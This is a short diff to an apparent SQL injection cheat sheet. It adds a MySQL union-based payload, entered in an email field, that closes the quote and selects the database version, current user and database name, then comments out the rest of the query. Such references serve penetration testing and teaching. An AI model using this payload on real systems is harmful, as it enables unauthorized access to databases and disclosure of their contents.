@@ -47,7 +47,10 @@
 
 
 ## MYSQL Union Based
-
+```sql
+sample@mail.com' UNION ALL SELECT concat_ws(0x3a, version(), user(), database())--
+```
+Extract Version Name, SQL User and Database
 ### Detect columns number
 
 First you need to know the number of columns
